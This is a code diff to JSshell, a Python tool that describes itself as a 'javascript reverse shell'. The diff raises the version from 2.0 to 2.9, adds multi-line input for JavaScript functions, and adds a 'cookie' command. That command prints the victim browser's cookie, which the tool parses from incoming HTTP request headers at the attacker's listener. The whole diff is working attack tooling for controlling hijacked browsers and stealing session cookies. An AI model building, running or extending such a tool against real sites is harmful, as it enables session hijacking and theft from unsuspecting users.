@@ -16,16 +16,17 @@ if sys.version_info < (3, 0):
 banner = '''%s    __              
   |(_  _ |_  _  |  |
 \_|__)_> | |(/_ |  |
-                      v2.0
+                      v2.9
 ''' % red
 hp = '''JSshell uses javascript code as shell commands. Also supports some commands:
 help                  This help
 domain                The source domain
 pwd                   The source path
+cookie                The user cookie
 exit, quit            Exit the JS shell'''
 
 
-parser = argparse.ArgumentParser(description='JSshell 2.0: javascript reverse shell')
+parser = argparse.ArgumentParser(description='JSshell 2.9: javascript reverse shell')
 parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
 parser.add_argument('-s', help='local sorce address', dest='host', default='')
 parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
@@ -70,9 +71,21 @@ def shell():
         
         if secs != 0:
             s.settimeout(secs)
-        buffer = input('%sjs-2.0%s$ ' % (red, white))
+        buffer = input('%sjs-2.9%s$ ' % (red, white))
         if buffer == 'exit' or buffer == 'quit':
             break
+        try:
+            if buffer[-1] == '{':
+                while 1:
+                    func = input('>' + ' '*9)
+                    buffer += '\n' + func
+                    try:
+                        if func[-1] == '}':
+                            break
+                    except:
+                        pass
+        except:
+            pass
             
         s.bind(('0.0.0.0', port))
         s.listen(2)
@@ -92,6 +105,11 @@ def shell():
                     print('Could not get the source path because the referer has been disabled')
             elif buffer == 'help':
                 print(hp)
+            elif buffer == 'cookie':
+                try:
+                    print(cookie)
+                except:
+                    print('Could not get the cookie because there is no cookie or because of some other reasons')
                               
             c.send(form + buffer.encode())
             c.shutdown(socket.SHUT_RDWR)
@@ -143,9 +161,11 @@ def main():
                 pth = '/'.join(referer.split('/')[3:])
                 if pth == '\r':
                     pth = '/'
+            elif 'cookie' in line.lower():
+                cookie = line.lower().replace('cookie: ', '')
         if len(cmd):
             c.send(form + cmd.encode())
-            print('%sjs-2.0%s$ %s' % (red, white, cmd))
+            print('%sjs-2.9%s$ %s' % (red, white, cmd))
             
         c.shutdown(socket.SHUT_RDWR)
         c.close()
